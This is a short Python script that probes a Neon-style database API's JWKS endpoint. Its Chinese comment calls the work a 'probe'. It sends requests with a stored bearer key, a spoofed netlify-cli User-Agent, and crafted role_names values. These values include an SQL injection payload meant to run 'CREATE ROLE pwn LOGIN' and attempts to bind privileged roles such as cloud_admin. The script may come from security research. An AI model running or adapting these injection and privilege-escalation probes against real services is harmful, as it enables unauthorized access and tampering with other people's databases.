# -*- coding: utf-8 -*-
"""GET /jwks 形态 + role_names 处理逻辑试探"""
import http.client, ssl, json, time
ctx = ssl.create_default_context()
P = 'orange-sun-90493739'
key = json.load(open(r'D:\scan\neon_report\_apikey.json'))['key']
from _neon_creds_stage import API_HOST, API_BASE, HEADERS_TEST

def req(method, path, body=None):
    conn = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=30)
    h = {'User-Agent': 'netlify-cli/17.0.0', 'Accept': 'application/json', 'Content-Type': 'application/json',
         'Authorization': 'Bearer ' + key}
    h.update(HEADERS_TEST)
    conn.request(method, API_BASE + path, body=json.dumps(body).encode() if body is not None else None, headers=h)
    r = conn.getresponse(); raw = r.read()
    st = r.status; conn.close()
    return st, raw

st, raw = req('GET', '/projects/%s/jwks' % P)
print('== GET /jwks -> %d' % st)
print(raw[:1500].decode(errors='replace'))
d = json.loads(raw) if raw else {}
jwks = d.get('jwks', [])
print('count:', len(jwks))

# role_names 试探(全部独立 provider_name 避免冲突)
vecs = [
    ('role own', {'role_names': ['neondb_owner']}),
    ('role cloud_admin', {'role_names': ['cloud_admin']}),
    ('role inject', {'role_names': ['x"; CREATE ROLE pwn LOGIN; --']}),
    ('role case mix', {'role_names': ['NeonDb_Owner']}),
    ('role skip+aud', {'role_names': ['neondb_owner'], 'skip_role_creation': True, 'jwt_audience': 'sec-test-aud'}),
]
for name, extra in vecs:
    body = {'jwks_url': 'https://www.googleapis.com/oauth2/v3/certs', 'provider_name': 'sec3-%s' % name[:8]}
    body.update(extra)
    st, raw = req('POST', '/projects/%s/jwks' % P, body)
    msg = ''
    try:
        msg = json.loads(raw).get('message', '')
    except Exception:
        msg = raw[:200].decode(errors='replace')
    print('\n[%s] -> %d | %s' % (name, st, msg[:250]))
    if st == 201:
        print('   resp:', raw[:400].decode(errors='replace'))
    time.sleep(1.2)
